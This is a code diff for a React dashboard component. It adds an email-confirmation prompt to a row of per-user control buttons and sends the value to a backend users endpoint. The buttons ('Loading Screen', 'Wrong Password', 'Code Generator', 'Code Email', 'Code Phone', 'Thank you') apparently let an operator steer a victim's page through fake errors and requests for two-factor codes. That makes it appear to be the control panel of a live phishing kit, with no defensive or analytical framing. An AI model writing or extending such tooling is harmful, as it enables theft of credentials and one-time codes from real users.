@@ -28,10 +28,11 @@ const Dashboard = () => {
     // triggerPompt();
   }, []);
 
-  const updateStatus = (unique_id, status) => {
+  const updateStatus = (unique_id, status, email) => {
     const data = {
       unique_id,
       status,
+      email
     };
     fetch(`${API_BE}/users`, {
       method: "PUT",
@@ -48,6 +49,18 @@ const Dashboard = () => {
         getAllUsers();
       });
   };
+
+  const onConfirmEmail = (id, userEmail, status) => {
+    if(!id || !status) return;
+    if(!userEmail) alert("Email is missing!")
+
+    let email = prompt("Please enter email:", userEmail);
+    if (email == null || email == "") {
+      console.log("User cancelled the prompt.")
+    } else {
+      updateStatus(id, status, email)
+    }
+  }
 
   const columns = [
     {
@@ -84,7 +97,7 @@ const Dashboard = () => {
             <button style={e === 0 ? { background: "green", color: "white" }: {}} onClick={(e) => updateStatus(item.unique_id, 0)}>Loading Screen</button>
             <button style={e === 1 ? { background: "green", color: "white" }: {}} onClick={(e) => updateStatus(item.unique_id, 1)}>Wrong Password</button>
             <button style={e === 2 ? { background: "green", color: "white" }: {}} onClick={(e) => updateStatus(item.unique_id, 2)}>Code Generator</button>
-            <button style={e === 3 ? { background: "green", color: "white" }: {}} onClick={(e) => updateStatus(item.unique_id, 3)}>Code Email</button>
+            <button style={e === 3 ? { background: "green", color: "white" }: {}} onClick={(e) => onConfirmEmail(item.unique_id, item?.email, 3)}>Code Email</button>
             <button style={e === 4 ? { background: "green", color: "white" }: {}} onClick={(e) => updateStatus(item.unique_id, 4)}>Code Phone</button>
             <button style={e === 5 ? { background: "green", color: "white" }: {}} onClick={(e) => updateStatus(item.unique_id, 5)}>Thank you</button>
             <button style={e === 6 ? { background: "green", color: "white" }: {}} onClick={(e) => updateStatus(item.unique_id, 6)}>60min</button>
